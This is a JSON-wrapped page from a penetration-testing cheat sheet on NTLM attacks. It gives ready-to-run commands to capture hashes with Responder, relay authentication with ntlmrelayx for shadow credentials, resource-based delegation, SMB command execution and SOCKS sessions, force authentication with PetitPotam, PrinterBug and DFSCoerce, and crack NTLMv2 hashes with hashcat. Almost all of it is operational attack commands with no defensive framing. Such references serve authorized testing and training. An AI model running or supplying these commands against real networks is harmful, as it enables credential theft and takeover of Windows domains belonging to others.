{"title": "responder", "source": "cheatsheet", "source_label": "Cheat Sheets", "path": "cheatsheet/ref-password-attacks-responder", "html": "<h1 id=\"password-attacks-responder\">responder</h1>\n<p>&gt; Capture or relay NTLM authentication on the network. Use when you can coerce or intercept auth.</p>\n<h3>Responder (Capture Hashes)</h3>\n<pre><code class=\"language-bash\"># Basic capture\nResponder -I tun0\n\n# Analysis mode (passive)\nResponder -I tun0 -A\n\n# Logs at: /opt/tools/Responder/logs/ or ~/.local/share/responder/logs/</code></pre>\n<h3>ntlmrelayx (Relay Instead of Capture)</h3>\n<pre><code class=\"language-bash\"># Relay to LDAP (for shadow creds or RBCD)\nntlmrelayx.py -t ldap://DC_IP --shadow-credentials --shadow-target victim -smb2support\n\n# Relay for RBCD\nntlmrelayx.py -t ldap://DC_IP --delegate-access -smb2support\n\n# Relay to SMB (command execution)\nntlmrelayx.py -t smb://TARGET -smb2support -c &#x27;whoami&#x27;\n\n# SOCKS mode (maintain relay session)\nntlmrelayx.py -t smb://TARGET -smb2support -socks</code></pre>\n<h3>Coercion (Force Authentication)</h3>\n<pre><code class=\"language-bash\"># PetitPotam (MS-EFSRPC)\nPetitPotam.py -u user -p pass -d domain LISTENER_IP TARGET_IP\n\n# PrinterBug (MS-RPRN)\nprinterbug.py &#x27;domain/user:pass@TARGET&#x27; LISTENER_IP\n\n# DFSCoerce (MS-DFSNM)\ndfscoerce.py -u user -p pass -d domain LISTENER_IP TARGET_IP</code></pre>\n<h3>When Relay Works</h3>\n<p>| Condition | SMB→SMB | SMB→LDAP | HTTP→LDAP | |-----------|---------|----------|-----------| | SMB signing required | No | No | N/A | | LDAP signing required | N/A | No | No | | Channel binding | N/A | No | No |</p>\n<h3>Crack NTLMv2</h3>\n<pre><code class=\"language-bash\">hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt</code></pre>", "excerpt": "responder &gt; Capture or relay NTLM authentication on the network. Use when you can coerce or intercept auth. Responder (Capture Hashes) # Basic capture Responder -I tun0 # Analysis mode (passive) Re…", "tags": ["reference", "password-attacks"]}